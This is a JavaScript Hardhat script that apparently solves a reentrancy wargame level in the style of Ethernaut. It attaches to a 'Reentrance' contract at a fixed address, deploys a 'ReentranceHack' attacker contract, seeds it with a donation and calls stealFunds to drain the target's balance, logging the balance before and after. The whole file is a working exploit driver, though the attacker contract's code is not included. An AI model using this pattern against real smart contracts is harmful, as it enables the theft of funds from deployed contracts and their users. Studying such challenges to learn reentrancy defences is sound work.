// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const provider = hre.waffle.provider;

async function main() {
  const reentranceInstanceAttr = "0xee991BaA8bdB761768397d4f13BC47420d475571";
  const Reentrance = await hre.ethers.getContractFactory("Reentrance");
  const reentrance = await Reentrance.attach(reentranceInstanceAttr);

  const ReentranceHack = await hre.ethers.getContractFactory("ReentranceHack");
  const reentranceHack = await ReentranceHack.deploy(reentrance.address);

  await reentrance.donate(reentranceHack.address, { value: 100000000000000 });
  console.log("Current reentrance balance:", ethers.utils.formatUnits(await provider.getBalance(reentrance.address), "ether"), "ETH");
  console.log("Stealing funds...");
  await reentranceHack.stealFunds({ gasLimit: 760000 });
  console.log("Finished steal request");
  console.log("Current reentrance balance:", ethers.utils.formatUnits(await provider.getBalance(reentrance.address), "ether"), "ETH");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
